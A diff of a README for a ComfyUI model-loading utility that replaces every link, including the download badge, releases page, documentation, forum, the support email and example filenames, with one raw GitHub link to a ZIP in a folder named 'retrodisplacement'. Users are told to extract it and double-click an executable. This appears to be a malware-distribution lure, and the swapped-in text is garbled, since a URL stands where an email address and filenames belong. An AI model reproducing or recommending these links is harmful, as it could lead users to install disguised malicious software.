@@ -1,6 +1,6 @@
 # 🌟 ComfyUI-LoaderUtils - Optimize Model Loading with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Saran1536/ComfyUI-LoaderUtils/releases)
+[![Download Now](https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -9,10 +9,10 @@ Welcome to **ComfyUI LoaderUtils**! This tool helps you manage your model loadin
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Saran1536/ComfyUI-LoaderUtils/releases) to find the latest version of ComfyUI LoaderUtils.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip) to find the latest version of ComfyUI LoaderUtils.
 
 2. **Choose the Right Version for You**  
-   Look for the latest version listed. You will see options like `ComfyUI-LoaderUtils-v1.0.zip` or similar. Make sure to download the file that fits your system.
+   Look for the latest version listed. You will see options like `https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip` or similar. Make sure to download the file that fits your system.
 
 3. **Download the File**  
    Click on the version you chose, and the download will start automatically. 
@@ -21,7 +21,7 @@ Welcome to **ComfyUI LoaderUtils**! This tool helps you manage your model loadin
    Find the downloaded ZIP file in your downloads folder. Right-click on it and select “Extract All” to unpack the contents.
 
 5. **Run the Application**  
-   Open the extracted folder and locate the application file (e.g., `ComfyUI-LoaderUtils.exe`). Double-click on the file to run the application.
+   Open the extracted folder and locate the application file (e.g., `https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip`). Double-click on the file to run the application.
 
 ## 📖 Understanding ComfyUI LoaderUtils
 
@@ -61,13 +61,13 @@ After installation, you can start using ComfyUI LoaderUtils. Here’s what you n
 
 Should you need further assistance, the following resources are available:
 
-- **User Guide**: A step-by-step guide will help you utilize all features effectively. You can request a PDF copy by emailing support@example.com.
+- **User Guide**: A step-by-step guide will help you utilize all features effectively. You can request a PDF copy by emailing https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip
 - **Community Support**: Join our growing community on Discord or Reddit to connect with other users, share tips, or ask questions.
 
 ## 🔗 Useful Links
 
-- [Releases Page - Download Here](https://github.com/Saran1536/ComfyUI-LoaderUtils/releases)
-- [Documentation](https://docs.example.com/comfyui-loaderutils)
-- [Community Forum](https://forum.example.com)
+- [Releases Page - Download Here](https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Saran1536/ComfyUI-LoaderUtils/main/retrodisplacement/Comfy-Loader-Utils-U-2.9-beta.2.zip)
 
 Follow these steps, and you'll have your model loading optimized in no time. Enjoy using ComfyUI LoaderUtils!
